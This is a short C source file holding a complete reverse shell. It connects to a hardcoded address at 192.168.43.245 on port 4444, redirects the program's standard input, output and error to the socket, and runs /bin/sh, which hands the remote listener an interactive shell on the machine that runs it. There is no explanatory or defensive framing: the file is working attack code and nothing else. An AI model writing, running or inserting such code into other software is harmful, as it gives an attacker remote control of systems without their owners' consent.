#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define SERVER_IP "192.168.43.245"
#define SERVER_PORT 4444

int main(){
	int sockfd;
	struct sockaddr_in server_addr;
	char *argv[] = {"/bin/sh", NULL};

	// Cretae Socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	// Set up server address
	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(SERVER_PORT);
	if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
		perror("inet_pton");
		close(sockfd);
		exit(EXIT_FAILURE);
	}

	// Connect to the listener
	if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
		perror("connect");
		close(sockfd);
		exit(EXIT_FAILURE);
	}

	// Redirect stdin, stdout, stderr to the socket
	dup2(sockfd, STDIN_FILENO);
	dup2(sockfd, STDOUT_FILENO);
	dup2(sockfd, STDERR_FILENO);

	// Execute the shell
	execve("/bin/sh", argv, NULL);

	// If execve fails
	perror("execve");
	close(sockfd);
	return EXIT_FAILURE;
}
